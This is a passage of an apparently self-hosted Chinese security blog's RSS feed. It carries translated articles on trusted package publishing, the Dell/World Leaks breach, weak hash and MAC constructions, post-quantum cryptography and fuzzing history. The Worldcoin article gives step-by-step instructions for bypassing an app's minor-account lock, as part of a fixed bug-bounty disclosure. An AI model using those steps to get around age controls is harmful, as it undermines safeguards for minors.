&lt;li&gt;防止持久化威胁&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;新型威胁应对&#34;&gt;新型威胁应对
&lt;/h2&gt;&lt;p&gt;技术设计时特别考虑了两种新型攻击场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;账户复活攻击&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过绑定GitHub用户唯一ID而非用户名&lt;/li&gt;
&lt;li&gt;防止攻击者接管废弃用户名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;恶意提交者风险&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可选环境限制实现&amp;quot;提交≠发布&amp;quot;的权限分离&lt;/li&gt;
&lt;li&gt;示例：仅main分支的production环境可发布&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;跨生态应用前景&#34;&gt;跨生态应用前景
&lt;/h2&gt;&lt;p&gt;该技术框架具有语言无关性，可应用于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rust的Crates.io&lt;/li&gt;
&lt;li&gt;Ruby的RubyGems&lt;/li&gt;
&lt;li&gt;JavaScript的NPM&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们预见这类技术将如同2019年的双因素认证，成为开源软件供应链的基础安全组件。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>戴尔遭勒索组织入侵 坚称泄露数据为&#34;伪造&#34;测试数据</title>
        <link>http://localhost:1313/p/%E6%88%B4%E5%B0%94%E9%81%AD%E5%8B%92%E7%B4%A2%E7%BB%84%E7%BB%87%E5%85%A5%E4%BE%B5-%E5%9D%9A%E7%A7%B0%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE%E4%B8%BA%E4%BC%AA%E9%80%A0%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE/</link>
        <pubDate>Sun, 03 Aug 2025 16:33:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%88%B4%E5%B0%94%E9%81%AD%E5%8B%92%E7%B4%A2%E7%BB%84%E7%BB%87%E5%85%A5%E4%BE%B5-%E5%9D%9A%E7%A7%B0%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE%E4%B8%BA%E4%BC%AA%E9%80%A0%E6%B5%8B%E8%AF%95%E6%95%B0%E6%8D%AE/</guid>
        <description>&lt;h1 id=&#34;戴尔遭勒索组织入侵-坚称泄露数据为伪造&#34;&gt;戴尔遭勒索组织入侵 坚称泄露数据为&amp;quot;伪造&amp;quot;
&lt;/h1&gt;&lt;p&gt;World Leaks组织访问并发布了戴尔客户解决方案中心的数据。戴尔声明称，该中心与客户及合作伙伴系统隔离，主要存储用于演示和测试的&amp;quot;合成&amp;quot;数据集。&lt;/p&gt;
&lt;p&gt;来源：Zoonar GmbH via Alamy Stock Photo&lt;br&gt;
戴尔已确认成为新兴勒索组织World Leaks的攻击目标，但这家科技巨头淡化了事件影响，称外泄数据来自其客户解决方案中心，属于&amp;quot;伪造&amp;quot;测试数据。&lt;/p&gt;
&lt;p&gt;本月初，这个由已关闭的Hunters International勒索团伙残余成员新组建的组织，公布了声称从戴尔网络窃取的数据。戴尔回应称，这些数据仅包含用于产品演示的合成数据、公开数据集、非敏感系统信息和测试输出。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;解决方案中心是专门用于演示戴尔产品和测试商业客户概念验证的环境，&amp;ldquo;戴尔在给Dark Reading等媒体的声明中强调，&amp;ldquo;该中心与客户及合作伙伴系统以及戴尔内部网络均保持隔离，不参与任何客户服务流程。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;相关blacksuit落幕-chaos勒索软件崛起&#34;&gt;相关：BlackSuit落幕 Chaos勒索软件崛起
&lt;/h2&gt;&lt;p&gt;戴尔尚未公开说明入侵者如何获取系统访问权限，也未透露事件后可能采取的安全措施。&lt;/p&gt;
&lt;h2 id=&#34;hunters-international谢幕-world-leaks登场&#34;&gt;Hunters International谢幕 World Leaks登场
&lt;/h2&gt;&lt;p&gt;尽管泄露数据无关紧要，但主要计算机厂商遭入侵仍非小事。戴尔曾多次遭遇重大入侵，包括2024年涉及4900万客户账户数据的事件，以及2018年可能涉及客户个人信息的数据泄露。&lt;/p&gt;
&lt;p&gt;此事件标志着尽管Hunters International本月早些时候关闭并发布了免费解密工具，但其后继者World Leaks已迅速接棒。据AttackIQ对手研究团队工程经理Andrew Costis透露，该组织早在关闭前就开始向World Leaks转型，六月份就对马萨诸塞州的Freedman HealthCare发动了首轮攻击。&lt;/p&gt;
&lt;h2 id=&#34;相关美国核机构深陷微软sharepoint漏洞危机&#34;&gt;相关：美国核机构深陷微软SharePoint漏洞危机
&lt;/h2&gt;&lt;p&gt;Costis警告称，World Leaks可能比其前身更危险，因为该组织专长勒索，迫使受害机构在&amp;quot;保护信息&amp;quot;与&amp;quot;支付赎金并承担进一步被利用风险&amp;quot;间做出艰难抉择。&lt;/p&gt;
&lt;p&gt;他建议所有组织都应采用对抗模拟技术，使安全团队能够针对常见勒索组织的基线行为测试防御措施，避免&amp;quot;在这些情况下措手不及&amp;rdquo;。&amp;ldquo;通过这种方式，组织可以切断攻击者觊觎的敏感信息访问权限，从而消除勒索组织的筹码。&amp;rdquo;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>YOLO哈希构造的致命缺陷：密码学安全实践指南</title>
        <link>http://localhost:1313/p/yolo%E5%93%88%E5%B8%8C%E6%9E%84%E9%80%A0%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 16:06:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/yolo%E5%93%88%E5%B8%8C%E6%9E%84%E9%80%A0%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E9%99%B7%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h2 id=&#34;yolomultihash&#34;&gt;YoloMultiHash
&lt;/h2&gt;&lt;p&gt;在Trail of Bits的审计工作中，YoloMultiHash是最常见的危险构造。当客户需要处理复杂数据结构或值数组时，常误用这种构造来实现Fiat-Shamir转录。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;错误构造&lt;/strong&gt;&lt;br&gt;
给定哈希函数H和消息集合M̂ = {M1,M2,…,Mn}，选择分隔符S，计算YoloMultiHash(M̂) = H(M1‖S‖M2‖S‖…‖S‖Mn)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;致命缺陷&lt;/strong&gt;&lt;br&gt;
核心问题在于编码模糊性。若消息Mi包含分隔符S，可将Mi拆分为M′i‖S‖M′′i，此时不同语义的输入M̂和M̃会产生相同哈希值，直接破坏哈希函数的抗碰撞性。该漏洞已被实际利用攻陷多个主流库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正确方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;采用专为多值哈希设计的TupleHash（SP800-185标准）&lt;/li&gt;
&lt;li&gt;或使用BLAKE3的&amp;quot;状态化哈希对象&amp;quot;特性&lt;/li&gt;
&lt;li&gt;结构化数据推荐Protocol Buffers/CBOR/BCS等无损序列化格式（注意JSON可能因空格/元素顺序导致哈希不一致）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;yolomac&#34;&gt;YoloMAC
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;错误构造&lt;/strong&gt;&lt;br&gt;
给定密钥K和消息M，计算YoloMAC(K,M) = H(K‖M)，有时会加入盐值S变为H(K‖S‖M)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;双重漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;长度扩展攻击&lt;/strong&gt;：对于SHA256等Merkle-Damgård结构哈希，攻击者可在未知K的情况下构造有效YoloMAC(K,M‖X)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码模糊性&lt;/strong&gt;：即使使用SHA3/BLAKE3仍存在风险。例如256位密钥K=K1‖K2时，YoloMAC(K1,K2‖M)会与YoloMAC(K,M)产生相同MAC值，导致密钥/消息对的可否认性攻击（类似AES-GCM标签漏洞）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;特别警告&lt;/strong&gt;&lt;br&gt;
Keccak官网虽声明&amp;quot;可直接将密钥前置作为MAC&amp;quot;，但未明确密钥长度/格式要求，实际应用中仍存在风险。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正确方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SHA2家族：必须使用HMAC（Python标准库已内置）&lt;/li&gt;
&lt;li&gt;SHA3家族：优先选择KMAC（支持XOF模式、输出长度绑定等特性）&lt;/li&gt;
&lt;li&gt;BLAKE2/3：直接使用内置密钥哈希模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;yolopbkdf&#34;&gt;YoloPBKDF
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;错误构造&lt;/strong&gt;&lt;br&gt;
给定密码P和盐值S，计算K = H(S‖P)或迭代版本Ki = H(S‖Ki-1)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;灾难性缺陷&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GPU集群可实现每秒千亿次破解尝试&lt;/li&gt;
&lt;li&gt;防御成本呈线性增长：用户若将迭代次数增加10倍，攻击者仅需多投入10倍资源&lt;/li&gt;
&lt;li&gt;完全无法抵抗彩虹表、时空权衡等经典攻击手段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;内存硬函数优势&lt;/strong&gt;&lt;br&gt;
以Argon2d的64MB内存需求为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;合法用户仅消耗0.8%内存（8GB设备）&lt;/li&gt;
&lt;li&gt;攻击者若想实现每秒百万次尝试，需每秒处理64TB数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;正确方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首选Argon2/scrypt等内存硬函数&lt;/li&gt;
&lt;li&gt;FIPS合规场景可采用PBKDF2+HKDF组合方案（需注意PBKDF2非内存硬特性）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;核心建议&#34;&gt;核心建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;拒绝重复造轮子&lt;/strong&gt;：BLAKE3原生支持密钥哈希/MAC，SHA3库普遍实现KMAC/TupleHash&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数化设计&lt;/strong&gt;：密钥长度、消息格式等细节必须严格规范&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源权衡&lt;/strong&gt;：密码学方案选择应使合法用户操作成本远低于攻击成本&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;密码学领域有句名言：&amp;ldquo;设计自己的加密协议就像设计自己的降落伞——你尽可以尝试，但千万别在第一次试跳时就用它。&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>后量子密码学：超越量子计算威胁的密码革新</title>
        <link>http://localhost:1313/p/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81%E5%AD%A6%E8%B6%85%E8%B6%8A%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E5%A8%81%E8%83%81%E7%9A%84%E5%AF%86%E7%A0%81%E9%9D%A9%E6%96%B0/</link>
        <pubDate>Sun, 03 Aug 2025 15:49:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81%E5%AD%A6%E8%B6%85%E8%B6%8A%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E5%A8%81%E8%83%81%E7%9A%84%E5%AF%86%E7%A0%81%E9%9D%A9%E6%96%B0/</guid>
        <description>&lt;h3 id=&#34;量子计算无关紧要的后量子密码学&#34;&gt;量子计算无关紧要的后量子密码学
&lt;/h3&gt;&lt;p&gt;最近你可能经常听到后量子（PQ）密码学的讨论。尽管没人真正见过量子计算机，但新的PQ标准比传统算法更安全、更具弹性且更灵活——即使量子计算机永远无法建成。&lt;/p&gt;
&lt;p&gt;关于量子计算机的争论众说纷纭：有人认为它将颠覆现有公钥密码体系，也有人认为具有密码破解能力的量子计算机只是幻想。真相是，在真正见到之前，我们无法确定其出现时间。&lt;/p&gt;
&lt;p&gt;但关键在于：&lt;strong&gt;抗量子特性并非后量子密码学的主要价值&lt;/strong&gt;。当前研究和标准化工作将催生基于多样化数学问题的更安全算法，这些算法汲取了过去40年的实践经验，并提供了用例灵活性。&lt;/p&gt;
&lt;h3 id=&#34;孤注一掷的风险&#34;&gt;孤注一掷的风险
&lt;/h3&gt;&lt;p&gt;当前广泛使用的公钥密码体系（如RSA、Diffie-Hellman和椭圆曲线算法）都基于隐藏子群问题的特例——而量子计算机恰好擅长解决这类问题。更严峻的是，即使不考虑量子计算机，互联网已将绝大多数加密方案都押注在这个单一数学问题上。过去40年的历史证明，这个&amp;quot;篮子&amp;quot;的安全性始终低于预期。&lt;/p&gt;
&lt;h3 id=&#34;持续升级的密钥长度&#34;&gt;持续升级的密钥长度
&lt;/h3&gt;&lt;p&gt;为应对因数分解和离散对数算法的进步，我们只能不断增大密钥长度：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1987年认为664位RSA密钥100年内无法破解&lt;/li&gt;
&lt;li&gt;如今NIST评估664位密钥仅提供65位安全性&lt;/li&gt;
&lt;li&gt;现代典型RSA密钥已达2048-4096位&lt;/li&gt;
&lt;li&gt;要达到256位AES的安全性需15360位RSA密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;椭圆曲线密码虽未经历类似密钥增长，但仍面临离散对数研究的新挑战。&lt;/p&gt;
&lt;h3 id=&#34;实现陷阱&#34;&gt;实现陷阱
&lt;/h3&gt;&lt;p&gt;当前算法存在诸多实现隐患：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RSA充满&amp;quot;地雷&amp;quot;般的陷阱&lt;/li&gt;
&lt;li&gt;有限域Diffie-Hellman存在参数选择问题&lt;/li&gt;
&lt;li&gt;椭圆曲线系统易受离曲线攻击等威胁&lt;/li&gt;
&lt;li&gt;所有算法都需要严防时序侧信道攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尽管标准制定缓解了部分问题（如Curve25519专为恒定时间实现设计），但底层设计缺陷仍使这些系统成为开发者的&amp;quot;危险品&amp;quot;（hazmat）。&lt;/p&gt;
&lt;h3 id=&#34;后量子密码的优势&#34;&gt;后量子密码的优势
&lt;/h3&gt;&lt;p&gt;观察NIST的后量子密码标准化进程可见显著改进：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;问题多样性&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CRYSTALS系列基于格问题（SIS/LWE）&lt;/li&gt;
&lt;li&gt;SPHINCS+基于哈希函数抗第二原像攻击&lt;/li&gt;
&lt;li&gt;未来可能加入基于椭圆曲线同源、纠错码等的新算法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;现代设计&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;易于实现恒定时间操作&lt;/li&gt;
&lt;li&gt;减少对RNG的依赖&lt;/li&gt;
&lt;li&gt;完全指定的随机采样技术&lt;/li&gt;
&lt;li&gt;确定性输入设计避免随机数复用问题&lt;/li&gt;
&lt;li&gt;预定义安全参数集&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;用例灵活性&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哈希签名（小公钥/大签名）&lt;/li&gt;
&lt;li&gt;McEliece（小密文/快解密/大公钥）&lt;/li&gt;
&lt;li&gt;不同场景可选用不同参数集&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;后量子密码的不确定性&#34;&gt;后量子密码的不确定性
&lt;/h3&gt;&lt;p&gt;新算法确实存在被攻破的风险（如RAINBOW和SIKE在标准化过程中被破解），但传统密码同样面临未证伪的安全假设。值得注意的是，GNFS算法已使1990年代的RSA和Diffie-Hellman密钥实际上&amp;quot;被攻破&amp;quot;，只是通过持续增加密钥长度掩盖了这一事实。&lt;/p&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论
&lt;/h3&gt;&lt;p&gt;无论量子计算机威胁是否被夸大，后量子密码研究的真正价值在于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将加密方案从单一数学问题中解放&lt;/li&gt;
&lt;li&gt;用现代设计消除常见实现错误&lt;/li&gt;
&lt;li&gt;提供多样化的算法选择&lt;/li&gt;
&lt;li&gt;为数学突破准备备用方案&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这本质上是一次密码学体系的&lt;strong&gt;多元化与现代化革新&lt;/strong&gt;。对于担心新算法风险的场景，混合密码系统（结合后量子与传统算法）仍是可行选择。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用飞行模式绕过未成年账户锁定：Worldcoin iOS应用逻辑漏洞分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E9%A3%9E%E8%A1%8C%E6%A8%A1%E5%BC%8F%E7%BB%95%E8%BF%87%E6%9C%AA%E6%88%90%E5%B9%B4%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9Aworldcoin-ios%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 15:33:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E9%A3%9E%E8%A1%8C%E6%A8%A1%E5%BC%8F%E7%BB%95%E8%BF%87%E6%9C%AA%E6%88%90%E5%B9%B4%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9Aworldcoin-ios%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h3&gt;&lt;p&gt;当iOS用户修改出生日期为未成年(如2015年)时，Worldcoin应用会锁定账户并要求联系客服解锁。但研究者发现通过以下步骤可绕过限制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;多次重复打开/关闭应用触发客服验证请求&lt;/li&gt;
&lt;li&gt;开启飞行模式后重新打开应用&lt;/li&gt;
&lt;li&gt;关闭飞行模式后点击&amp;quot;开始政府验证&amp;quot;&lt;/li&gt;
&lt;li&gt;使用护照RFID完成自主解锁（阿根廷护照因技术问题未完成完整验证）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;：业务逻辑错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响版本&lt;/strong&gt;：未披露的具体iOS版本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;根本原因&lt;/strong&gt;：应用在恢复网络连接时未重置验证状态&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击前提&lt;/strong&gt;：需物理接触设备并修改出生日期&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;时间线&#34;&gt;时间线
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2025-05-09：漏洞提交&lt;/li&gt;
&lt;li&gt;2025-05-19：厂商确认漏洞（Triaged状态）&lt;/li&gt;
&lt;li&gt;2025-05-23：发放300美元赏金&lt;/li&gt;
&lt;li&gt;2025-06-30：漏洞修复完成并公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;强制应用在恢复网络连接时重新验证账户状态&lt;/li&gt;
&lt;li&gt;增加服务端年龄验证机制&lt;/li&gt;
&lt;li&gt;对频繁的账户锁定操作实施速率限制&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>智能模糊测试革命 - 自动化漏洞挖掘的技术演进</title>
        <link>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E9%9D%A9%E5%91%BD-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B/</link>
        <pubDate>Sun, 03 Aug 2025 15:17:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%99%BA%E8%83%BD%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E9%9D%A9%E5%91%BD-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B/</guid>
        <description>&lt;h2 id=&#34;智能模糊测试革命&#34;&gt;智能模糊测试革命
&lt;/h2&gt;&lt;p&gt;我最近有幸在BSidesLisbon大会上发表主题演讲。会议非常精彩，特别感谢Bruno Morisson的邀请。如果你喜欢波特酒，这个会议绝对不容错过！我建议附近地区的人明年都来参加。&lt;/p&gt;
&lt;p&gt;我认为有必要将自动化漏洞发现的最新进展置于更广阔的背景下审视。如果你没有密切关注，可能会错过网络大挑战（Cyber Grand Challenge）、AFL和libFuzzer等重要进展，但它们对我们行业的潜在影响是巨大的。&lt;/p&gt;
&lt;p&gt;在IT Defense会议上再次演讲后，我现在想与互联网分享这个主题。你可以通过下方视频了解我对该研究领域发展历程、现状和未来方向的见解。请欣赏！&lt;/p&gt;
&lt;h3 id=&#34;技术突破&#34;&gt;技术突破
&lt;/h3&gt;&lt;p&gt;过去两年在自动化安全测试领域取得的进步，超过了之前十年的总和。AFL将业界最佳实践集成到一个易用工具中，DARPA网络大挑战提供了可靠的竞争基准和新研究资金，而Project Springfield（即SAGE）现已向公众开放。这些新技术的普及可能对我们行业产生巨大影响。&lt;/p&gt;
&lt;p&gt;这些工具如何工作？与过去的方法有何不同？它们的优势和局限在哪里？现在如何使用这些工具？这些技术将如何发展？还需要哪些进一步开发？最后，人类在安全开发生命周期中还能主导多久？&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;点击此处查看完整幻灯片&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;威斯康星大学模糊测试课程项目(1988)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;PROTOS - 消除软件漏洞的系统方法(2002)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.ee.oulu.fi/roles/ouspg/PROTOS_MSR2002-protos&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.ee.oulu.fi/roles/ouspg/PROTOS_MSR2002-protos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;基于块的协议分析在安全测试中的优势(2002)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://www.immunitysec.com/downloads/advantages_of_block_based_analysis.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.immunitysec.com/downloads/advantages_of_block_based_analysis.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;DART: 定向自动化随机测试(2005)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://wkr.io/public/ref/godefroid2005dart.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wkr.io/public/ref/godefroid2005dart.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;EXE: 自动生成致命输入(2006)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://web.stanford.edu/~engler/exe-ccs-06.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://web.stanford.edu/~engler/exe-ccs-06.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;EXE: 十年后(2016)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://ccadar.blogspot.com/2016/11/exe-10-years-later.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://ccadar.blogspot.com/2016/11/exe-10-years-later.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;自动化白盒模糊测试(2008)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://patricegodefroid.github.io/public_psfiles/ndss2008.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://patricegodefroid.github.io/public_psfiles/ndss2008.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;American Fuzzy Lop (AFL)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://lcamtuf.coredump.cx/afl/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://lcamtuf.coredump.cx/afl/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;DARPA网络大挑战参赛者门户(2013)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://archive.darpa.mil/CyberGrandChallenge_CompetitorSite/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://archive.darpa.mil/CyberGrandChallenge_CompetitorSite/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;漏洞利用与状态机(2011)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://archives.scovetta.com/pub/conferences/infiltrate_2011/Fundamentals_of_exploitation_revisited.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://archives.scovetta.com/pub/conferences/infiltrate_2011/Fundamentals_of_exploitation_revisited.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;你的工具比我的好？证明它(2016)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://blog.trailofbits.com/2016/08/01/your-tool-works-better-than-mine-prove-it/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.trailofbits.com/2016/08/01/your-tool-works-better-than-mine-prove-it/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;微软Springfield(2016)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/en-us/springfield/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.microsoft.com/en-us/springfield/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Google OSS-Fuzz(2016)&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/google/oss-fuzz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/google/oss-fuzz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;LLVM libFuzzer&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;http://llvm.org/docs/LibFuzzer.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://llvm.org/docs/LibFuzzer.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;GRR - DECREE二进制文件的高通量模糊测试器和模拟器&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/grr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/trailofbits/grr&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Manticore - Python符号执行平台&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/manticore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/trailofbits/manticore&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;McSema - x86到机器码翻译框架&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/mcsema&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/trailofbits/mcsema&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;DARPA多操作系统挑战集&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/cb-multios&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/trailofbits/cb-multios&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Trail of Bits关于网络大挑战的出版物&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://blog.trailofbits.com/category/cyber-grand-challenge/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.trailofbits.com/category/cyber-grand-challenge/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
